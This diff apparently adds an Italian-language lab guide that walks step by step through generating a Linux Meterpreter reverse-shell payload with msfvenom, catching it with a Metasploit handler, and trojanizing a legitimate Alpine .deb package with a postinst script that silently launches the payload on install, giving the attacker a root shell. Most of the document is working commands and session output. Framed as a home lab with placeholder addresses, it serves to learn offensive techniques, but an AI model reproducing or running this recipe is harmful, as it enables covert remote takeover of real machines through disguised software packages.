@@ -1,0 +1,161 @@
+DA KALI
+
+1 - Apri un terminale ed esegui questi comandi 
+mkdir malware
+cd malware/
+sudo msfvenom --arch x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<IP MACCHINA KALI> LPORT=443 --smallest -i 4 -f elf -o malicious
+se tutto è andato bene al comando ls uscirà così
+┌──(kali㉿Kali)-[~/scriptHacker/Lab-08/malware]
+└─$ ls
+malicious
+
+2 - Apri un altro ternimale ed esegui questo comando
+sudo msfconsole
+[sudo] password for kali: 
+                                                  
+
+
+                  @@@
+                  @@@
+                   @@@
+                   @@@
+           @@@@@@@@@@@@@@@@@@@@@@
+         @@@@@@@@@@@@@@@@@@@@@@@@@@
+       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+     @@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@
+   @@@@@@@@@   @@@@@@@@@@@@@@   @@@@@@@@@
+ @@@@@@@@@@     @@@@@@@@@@@@     @@@@@@@@@@
+@@@@@@@@@@       @@@@  @@@@       @@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@
+ @@@@@@@@  @@ @@ @@ @@ @@ @@ @@ @  @@@@@@@@
+   @@@@@@@                        @@@@@@@
+     @@@@@@  @@ @@ @@ @@ @@ @@ @ @@@@@@
+       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+         @@@@@@@@@@@@@@@@@@@@@@@@@@
+           @@@@@@@@@@@@@@@@@@@@@@
+
+
+
+       =[ metasploit v6.3.27-dev                          ]
++ -- --=[ 2335 exploits - 1220 auxiliary - 413 post       ]
++ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: View missing module options with show 
+missing
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp                                                                                                                                           
+msf6 exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp                                                                                                                      
+PAYLOAD => linux/x86/meterpreter/reverse_tcp                                                                                                                                                     
+msf6 exploit(multi/handler) > set LHOST =<IP MACCHINA KALI>                                                                                                                                          
+LHOST => =<IP MACCHINA KALI>                                                                                                                                                                         
+msf6 exploit(multi/handler) > set LPORT 443                                                                                                                                                      
+LPORT => 443                     
+
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on <IP MACCHINA KALI>
+
+
+
+DALLA MACCHINA VITTIMA (nel mio caso un Ubuntu)
+3 - scarica i file "malicious" generato nella macchina kali e lo inserisci in una cartella
+3.1 - un modo comodo per scaricare il file nella stessa sottorete è utilizzare il comando dal terminale di kali nella cartella interessata 'sudo python3 -m http.server 80' 
+3.2 - accedere dalla macchina Ubuntu dal browser e ricerca http://<IP MACCHINA KALI>/
+4 - apri con il terminale la cartella dove è presente il file malicious
+sudo chmod 775 malicious
+./malicious 
+
+
+
+
+
+5 - Ora dal terminale di KAli uscirà questo 
+
+[*] Sending stage (1017704 bytes) to <IP MACCHINA UBUNTU>
+[*] Meterpreter session 1 opened (<IP MACCHINA KALI>:443 -> <IP MACCHINA UBUNTU>:40924) at 2025-10-31 16:02:41 +0000
+
+meterpreter > ls
+Listing: /home/ubuntu/scripthacker/Lab-08/malware
+=================================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100775/rwxrwxr-x  207   fil   2025-10-31 13:45:09 +0000  malicious
+
+5.1 - se vuoi usare il terminale utilizza il comando shell 
+meterpreter > shell
+Process 11124 created.
+Channel 1 created.
+whoami
+ubuntu
+
+6 - Da Ubuntu e da kali
+scaricare SYNAPTIC (sudo apt-get update sudo apt-get install synaptic ) avviarlo (sudo synaptic) e cercare la versione di alpine. Le due versioni non è necessaio corrispondano.
+SU kali scarica la versione di Alpine presente nella macchina Ubuntu (dal link https://code.launchpad.net/ubuntu/noble/amd64/alpine/2.26+dfsg-1build3) e inseriscilo nella cartella dove è presente il file malicious
+Apri il terminale nella cartella dove è presente il file deb e lancia " engrampa alpine_2.26+dfsg-1build3_amd64.deb -e mailTrojan". questo comando ti spacchetterà il file deb
+      (se engrampa non risulta scaricato lancia questi comandi  "sudo apt update sudo apt install engrampa -y engrampa --version")   
+Apri la cartella creata, e apri la cartella DEBIAN. crea il file "postinst" e al suo interno metti questo script 
+"#!/bin/sh
+set -e
+# postinst script for launching the ELF executable
+# Verifica che l'applicativo ELF esista ed è eseguibile
+if [ -x /usr/bin/malicious ];then
+echo "Eseguo /usr/bin/myapp"
+# Lancia l'applicativo ELF in background
+/usr/bin/malicious &
+# Salva l'ID del processo (PID) se necessario
+echo $! > /var/run/malicious.pid
+echo "/usr/bin/maliciuos è stato avviato con successo"
+else
+echo "Errore: /usr/bin/malicious non esiste o non è eseguibile"
+exit 1
+fi
+exit 0"
+
+apri la cartella da terminale e lanca il comando "chmod +x /home/kali/scriptHacker/Lab-08/malware/mailTrojan/DEBIAN/postinst"
+apri la cartella mailTrojan da terminale e lancia "cd usr/bin" e successivamente lancia 
+"sudo msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp  LHOST=<IP MACCHINA KALI> LPORT=443 -b "\x00" -f elf -o malicious"                                                     
+poi lancia "sudo chmod +x malicious"                                                                                                                                                                      
+
+----------------------------------
+DALLA MACCHINA VITTIMA (nel mio caso un Ubuntu)
+7 - scarica i file "mailTrojan.deb" generato nella macchina kali e lo inserisci in una cartella
+7.1 - un modo comodo per scaricare il file nella stessa sottorete è utilizzare il comando dal terminale di kali nella cartella interessata 'sudo python3 -m http.server 80' 
+7.2 - accedere dalla macchina Ubuntu dal browser e ricerca http://<IP MACCHINA KALI>/
+8 - accedi alla cartella dove è presente il file e lancia il comando "sudo dpkg -i mailTrojan.deb"
+9 - Ora dal terminale di KAli uscirà questo 
+
+[*] Sending stage (1017704 bytes) to <IP MACCHINA UBUNTU>
+[*] Meterpreter session 1 opened (<IP MACCHINA KALI>:443 -> <IP MACCHINA UBUNTU>:40924) at 2025-10-31 16:02:41 +0000
+
+meterpreter > ls
+Listing: /home/ubuntu/scripthacker/Lab-08/malware
+=================================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100775/rwxrwxr-x  207   fil   2025-10-31 13:45:09 +0000  malicious
+
+9.1 - se vuoi usare il terminale utilizza il comando shell 
+meterpreter > shell 
+Process 16545 created.
+Channel 3 created.
+whoami
+root
+
+
+
+-------------------------------------
+
+END - per concludere il malicius dalla macchina vittima manda controlla le attività con il comando "ps aux"
+END.1 - dovrebbe uscire un output che fra le varie voci dovrebbe uscire questa riga "ubuntu     11122  0.0  0.0   1216  1024 pts/1    Sl+  10:02   0:01 ./malicious"
+      - per chiudere l'attività  esegui "kill 11122" o "kill -9 11122"( o cosa c'è scritto al posto del valore nella colonna PID
+      - dalla macchina kali uscirà " [*] <IP MACCHINA UBUNTU> - Meterpreter session 1 closed.  Reason: Died "
+
